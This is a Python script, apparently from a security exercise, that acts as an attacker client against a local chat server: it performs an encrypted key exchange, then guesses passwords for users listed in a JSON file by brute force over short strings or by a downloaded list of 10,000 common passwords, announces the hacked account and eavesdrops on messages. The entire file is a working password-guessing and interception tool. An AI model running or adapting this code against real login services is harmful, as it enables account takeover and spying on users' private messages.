import socket
import ssl
import rsa
import threading
import json
import itertools
import string
import requests
import sys
import random 

def generate_random_string(length):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

guessed = False
guessedUsername = None
guessedPassword = None

# Create a SSL context
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_verify_locations('./server.crt')

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Wrap the client socket with SSL
client_socket = context.wrap_socket(client_socket, server_hostname=socket.gethostname())

client_socket.connect(('127.0.0.1', 12345))

# Receive serialized public key from server
serialized_public_key = client_socket.recv(1024)

# Deserialize public key
public_key = rsa.deserialize_public_key(serialized_public_key)

# Generate AES key
aes_key = rsa.generate_aes_key()

# Encrypt AES key with server's public key
encrypted_aes_key = rsa.encrypt_aes_key(public_key, aes_key)

# Send encrypted AES key to server
client_socket.send(encrypted_aes_key)

# Function to listen to communication
def listen_to_communication():
    while True:
        encrypted_message = client_socket.recv(1024)
        message = rsa.decrypt_message(encrypted_message, aes_key)
        print(f"Received message: {message}")

# Ask the user to whether he wants to guess a password or listen to communication
listen_or_attack = input("Enter whether to listen or guess password (1 for listening, other char for password guessing): ")

if listen_or_attack == '1':
    while True:
        username = generate_random_string(10)
        password = generate_random_string(10)
        client_socket.send(username.encode('utf-8'))
        client_socket.send(password.encode('utf-8'))

        response = client_socket.recv(1024).decode('utf-8')
        if response == 'you are now connected!\n':
            break
    listen_to_communication()





# Ask the user to choose the type of attack
attack_type = input("Enter attack type (1 for brute force, 2 for common password attack): ")

# Ask the user for a username
username_input = input("Enter a username (leave blank to try all users): ")

# Load users from users.json
with open('users.json', 'r') as file:
    data = json.load(file)
    users = data['users']

# If a username was entered, only keep that user
if username_input:
    users = [user for user in users if user['username'] == username_input]
    if not users:
        print("User not found")
        sys.exit()

if attack_type == '1':
    # Generate all possible 1 to 4-character passwords
    chars = string.ascii_lowercase + string.digits  # + string.ascii_uppercase
    brute_force_passwords = [''.join(p) for i in range(1, 5) for p in itertools.product(chars, repeat=i)]
    password_list = brute_force_passwords
elif attack_type == '2':
    # Get 10,000 common passwords
    response = requests.get('https://lucidar.me/en/security/files/10000-most-common-passwords.json')
    common_passwords = json.loads(response.text)
    password_list = common_passwords

# Attempt to guess passwords for each user
for user in users:
    if guessed:  # If a password has been guessed, break the outer loop as well
        break
    username = user['username']
    for password in password_list:
        # Send username and password
        client_socket.send(username.encode('utf-8'))
        client_socket.send(password.encode('utf-8'))
        print("Trying",password)

        # Check server response
        response = client_socket.recv(1024).decode('utf-8')
        if response == 'you are now connected!\n':
            print(f"Guessed password for {username}: {password}")
            guessedUsername = username
            guessedPassword = password
            guessed = True
            break

if not guessed:
    print("Failed to retrieve password")
else:
    message = f"{guessedUsername} have been hacked!\n"
    encrypted_message = rsa.encrypt_message(message, aes_key)
    client_socket.send(encrypted_message)

    # Ask the user if they want to listen to messages
    mode = input("Do you want to listen to messages? (yes/no): ")

    if mode.lower() == 'yes':
        # Start the listening thread
        listening_thread = threading.Thread(target=listen_to_communication)
        listening_thread.start()
